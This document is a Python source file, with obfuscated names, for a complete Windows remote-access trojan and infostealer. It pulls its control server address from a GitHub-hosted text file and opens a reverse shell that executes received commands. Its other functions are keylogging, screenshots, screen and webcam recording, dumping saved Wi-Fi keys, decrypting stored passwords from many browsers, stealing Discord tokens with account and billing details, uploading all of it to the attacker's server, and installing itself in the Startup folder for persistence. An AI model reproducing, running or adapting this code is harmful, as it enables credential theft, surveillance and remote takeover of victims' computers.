import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil,re
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
hZOHPNkhBieBPOHeoRu = ""
ofUTyjKkRfv = ""
RfdecCagQEBGMOZkTEtEX = "17.01.25.0"
KEYLOGONSTART = True
bAKKWlaxhUbeMbnCOXlPd = "!"
plRtHSBhfjTCZuLqViBD = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
guXcJonSMCObtRNumrdZ = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
VAiZAayWDDp = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
wgOewIPanRupXTDsVM = {
	'chrome':VAiZAayWDDp+'Google\\Chrome\\User Data','chromium':VAiZAayWDDp+'Chromium\\User Data','chrome-canary':VAiZAayWDDp+'Google\\Chrome SxS\\User Data',
	'msedge':VAiZAayWDDp+'Microsoft\\Edge\\User Data','msedge-canary':VAiZAayWDDp+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':VAiZAayWDDp+'Microsoft\\Edge Beta\\User Data','msedge-dev':VAiZAayWDDp+'Microsoft\\Edge Dev\\User Data',
	'avast':VAiZAayWDDp+'AVAST Software\\Browser\\User Data','amigo':VAiZAayWDDp+'Amigo\\User Data',
	'torch':VAiZAayWDDp+'Torch\\User Data','kometa':VAiZAayWDDp+'Kometa\\User Data','orbitum':VAiZAayWDDp+'Orbitum\\User Data',
	'cent-browser':VAiZAayWDDp+'CentBrowser\\User Data','7star':VAiZAayWDDp+'7Star\\7Star\\User Data',
	'sputnik':VAiZAayWDDp+'Sputnik\\Sputnik\\User Data','vivaldi':VAiZAayWDDp+'Vivaldi\\User Data',
	'epic-privacy-browser':VAiZAayWDDp+'Epic Privacy Browser\\User Data','uran':VAiZAayWDDp+'uCozMedia\\Uran\\User Data',
	'yandex':VAiZAayWDDp+'Yandex\\YandexBrowser\\User Data','brave':VAiZAayWDDp+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':VAiZAayWDDp+'Iridium\\User Data','coccoc':VAiZAayWDDp+'CocCoc\\Browser\\User Data',
	'opera':USER_ROAMING+'Opera Software\\Opera Stable','opera-gx':USER_ROAMING+'Opera Software\\Opera GX Stable'
}
def LkdUMXVGMqOZrDJIqkXySn(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def nCVhbAUvBAVzibSW(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	uDrRTszAnldpDL = data.decode("utf-8").replace("\n","")
	if not uDrRTszAnldpDL.startswith(bAKKWlaxhUbeMbnCOXlPd):
		proc = subprocess.run(uDrRTszAnldpDL, shell=True, capture_output=True)
		gCqbCFpwJQMGXSDyH = proc.stdout + proc.stderr
		s.send(gCqbCFpwJQMGXSDyH)
		return
	yYYifTJhDrYzbhCGJeIf = uDrRTszAnldpDL.split(" ")[0][1:]
	args = " ".join(uDrRTszAnldpDL.split()[1:]).split()
	if yYYifTJhDrYzbhCGJeIf == "download":
		ldrmiRmbJWeuM(s, uDrRTszAnldpDL)
	elif yYYifTJhDrYzbhCGJeIf == "screenshot":
		nCTRWKDrjcrJ(s)
	elif yYYifTJhDrYzbhCGJeIf == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif yYYifTJhDrYzbhCGJeIf == "update":
		sLhfnmRslzWRoNoLFKnC(s)
	elif yYYifTJhDrYzbhCGJeIf == "wifi":
		YWFdNKDItkEoYkxPE(s)
	elif yYYifTJhDrYzbhCGJeIf == "screenrecord":
		tOqFuoBdJ(s, args)
	elif yYYifTJhDrYzbhCGJeIf == "browsers":
		lZRLdHJkl(s)
	elif yYYifTJhDrYzbhCGJeIf == "webcam":
		webCam(s, args)
	elif yYYifTJhDrYzbhCGJeIf == "cd":
		try: os.chdir(uDrRTszAnldpDL[4:])
		except: pass
def ldrmiRmbJWeuM(s, uDrRTszAnldpDL):
	SBHBlkKljLQwXUZN = uDrRTszAnldpDL.replace(bAKKWlaxhUbeMbnCOXlPd+"download ","").split(",")
	gCqbCFpwJQMGXSDyHs = ""
	for f in SBHBlkKljLQwXUZN:
		gCqbCFpwJQMGXSDyHs += UQpywsSGXf(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(gCqbCFpwJQMGXSDyHs, "utf-8"))
def nCTRWKDrjcrJ(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	iCHivYL = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(iCHivYL)
	image.close()
	r = UQpywsSGXf(iCHivYL, "api/sscap")
	os.remove(iCHivYL)
	s.send(bytes(r,"utf-8"))
def webCam(s, args):
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(VAiZAayWDDp+"wc.jpg", camera.get_data(0))
		camera.close()
		r=UQpywsSGXf(VAiZAayWDDp+"wc.jpg","api/wc")
		s.send(bytes(r,"utf-8"))
	except:
		s.send(bytes("[!] 404\n", "utf-8"))
def tOqFuoBdJ(s, args):
	nhAGinMon = 15
	if not args == []:
		try: nhAGinMon = int(args[0])
		except: pass
	RFUhddVtxJS = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	FrfJYobvQnPQbmew = []
	fps = 11
	numFrames = nhAGinMon * fps
	for _ in range(numFrames):
		FrfJYobvQnPQbmew.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(RFUhddVtxJS, FrfJYobvQnPQbmew, fps=fps, quality=8)
	UQpywsSGXf(RFUhddVtxJS, "api/screc")
def UQpywsSGXf(dZYacKShdyPNyFfFPwU, ivQBOjKMzuiv, BZkxuqaGYRpP=None):
	if not os.path.isfile(dZYacKShdyPNyFfFPwU):
		return "[!] 404: "+dZYacKShdyPNyFfFPwU+"\n"
	headers = {"user":os.getlogin()}
	if BZkxuqaGYRpP is not None:
		headers = {**headers, **BZkxuqaGYRpP}
	f = open(dZYacKShdyPNyFfFPwU, "rb")
	requests.post("http://"+hZOHPNkhBieBPOHeoRu+":5555/"+ivQBOjKMzuiv,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def JfUVvpWDXvuXxb(ZKGRXGhbjWAp, ivQBOjKMzuiv):
	if ZKGRXGhbjWAp.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+hZOHPNkhBieBPOHeoRu+":5555/"+ivQBOjKMzuiv,
		data=ZKGRXGhbjWAp,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def sLhfnmRslzWRoNoLFKnC(s):
	h, p, v = xOTVVSwmjoyVXQMBouS(True)
	if (v != RfdecCagQEBGMOZkTEtEX):
		JhTYyCOraEv(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def YWFdNKDItkEoYkxPE(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	eNMLxkUXHQtQqmCDKKVudoM = ""
	for p in profiles:
		try: eNMLxkUXHQtQqmCDKKVudoM+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: eNMLxkUXHQtQqmCDKKVudoM+=f"    {p} - N/A\n"
	s.send(bytes(eNMLxkUXHQtQqmCDKKVudoM, "utf-8"))
def JhTYyCOraEv(zmLKNHmOoyfXjQNLbH):
	dgReZfck = os.path.basename(__file__)
	fileType = dgReZfck.split(".")[-1]
	RYuMxWSLvkTCbiXSRasIOE = dgReZfck.split(".")[0]+"."+zmLKNHmOoyfXjQNLbH+".pyw" if fileType.startswith("py") else ".exe"
	JlBXmzehzcLWXE = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), RYuMxWSLvkTCbiXSRasIOE)
	if not os.path.isfile(JlBXmzehzcLWXE):
		with open(JlBXmzehzcLWXE, "w+") as f:
			f.write(requests.get(guXcJonSMCObtRNumrdZ+"file."+ "pyw" if JlBXmzehzcLWXE.split(".")[-1].startswith("py") else "exe").text)
	else:
		KEYLOGONSTART = False
def xOTVVSwmjoyVXQMBouS(force=False):
	global hZOHPNkhBieBPOHeoRu, ofUTyjKkRfv
	if force or hZOHPNkhBieBPOHeoRu == "" or ofUTyjKkRfv == "":
		data = requests.get(plRtHSBhfjTCZuLqViBD).text.replace("\n","").split(":")
		hZOHPNkhBieBPOHeoRu = data[0].strip()
		ofUTyjKkRfv = data[1].strip()
		zmLKNHmOoyfXjQNLbH = data[2].strip()
	return hZOHPNkhBieBPOHeoRu, ofUTyjKkRfv, zmLKNHmOoyfXjQNLbH
def QVpQQsNazQVIcOpSOMwXPi():
	try:
		PnRTCzRZswSSLnCyoEvByZ = "settings.xpb"
		VvkcflspupjCulELh = sorted([file for file in os.listdir(VAiZAayWDDp) if os.path.isfile(VAiZAayWDDp+"\\"+file) and file.endswith(PnRTCzRZswSSLnCyoEvByZ.split(".")[-1])])
		if PnRTCzRZswSSLnCyoEvByZ in VvkcflspupjCulELh:
			VvkcflspupjCulELh.remove(PnRTCzRZswSSLnCyoEvByZ)
		UCbmqYyBxPvqULAyyqahosC = os.path.join(VAiZAayWDDp,PnRTCzRZswSSLnCyoEvByZ)
		if len(VvkcflspupjCulELh) > 0:
			with open(UCbmqYyBxPvqULAyyqahosC, "ab+") as f:
				for file in VvkcflspupjCulELh:
					temp = os.path.join(VAiZAayWDDp,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		UQpywsSGXf(UCbmqYyBxPvqULAyyqahosC, "api/log")
		if os.path.isfile(UCbmqYyBxPvqULAyyqahosC):
			os.remove(UCbmqYyBxPvqULAyyqahosC)
	except:
		pass
def ywlgcDmPiXwwtJN():
	logging.basicConfig(filename=(VAiZAayWDDp+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def LWntUMAsPp(k):
		logging.info(str(k))
	k=Listener(on_press=LWntUMAsPp)
	wLwvEaroOlZ = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in wLwvEaroOlZ:
		l.setLevel(logging.CRITICAL)
	k.start()
def lZRLdHJkl(s, upload=False):
        KtySjAzbTjflMaBiDTNWY = "\n"
        for browser in wgOewIPanRupXTDsVM:
                path = wgOewIPanRupXTDsVM[browser]
                BCDEdumZdBYt = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        BCDEdumZdBYt = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", VAiZAayWDDp+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(VAiZAayWDDp+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        KtySjAzbTjflMaBiDTNWY += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(BCDEdumZdBYt, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                KtySjAzbTjflMaBiDTNWY += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(VAiZAayWDDp+"\\db.db")
        pbPcsFQ = []
        discordPaths = [USER_ROAMING+'\\discord\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordcanary\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                BCDEdumZdBYt = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        BCDEdumZdBYt = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(BCDEdumZdBYt, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in pbPcsFQ:
                                                pbPcsFQ.append(decryptedToken)
        NoutOEM = "https://discord.com/api/v9/users/@me"
        if pbPcsFQ: KtySjAzbTjflMaBiDTNWY +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for YgzKPWQomXNz in pbPcsFQ:
                headers = {"Content-Type":"application/json","Authorization":YgzKPWQomXNz,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(NoutOEM, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(NoutOEM+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(NoutOEM+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                KtySjAzbTjflMaBiDTNWY += f"\n{user}\n{'-'*len(user)}\nToken: {YgzKPWQomXNz}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        KtySjAzbTjflMaBiDTNWY += "\n"
        if not upload:
                s.send(bytes(KtySjAzbTjflMaBiDTNWY,"utf-8"))
        else:
                JfUVvpWDXvuXxb(KtySjAzbTjflMaBiDTNWY, "api/google")
def NuhHfdCeBPSCLglTTyYnaL():
	h, p, v = xOTVVSwmjoyVXQMBouS()
	try:
		QVpQQsNazQVIcOpSOMwXPi()
		lZRLdHJkl(None,True)
		if RfdecCagQEBGMOZkTEtEX != v:
			JhTYyCOraEv(v)
		if KEYLOGONSTART:
			ywlgcDmPiXwwtJN()
	except:
		pass
	QiMpfmYDVacYtNQwc = bytes(("(old)"if RfdecCagQEBGMOZkTEtEX!=v else "")+"["+RfdecCagQEBGMOZkTEtEX+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		kJCLOQwzJgaJydlSXPKCI=False
		try:
			s=LkdUMXVGMqOZrDJIqkXySn(h, p)
			while not kJCLOQwzJgaJydlSXPKCI:
				s.send(QiMpfmYDVacYtNQwc)
				kJCLOQwzJgaJydlSXPKCI=nCVhbAUvBAVzibSW(s)
			s.close()
		except:
			pass
		time.sleep(5)
NuhHfdCeBPSCLglTTyYnaL()
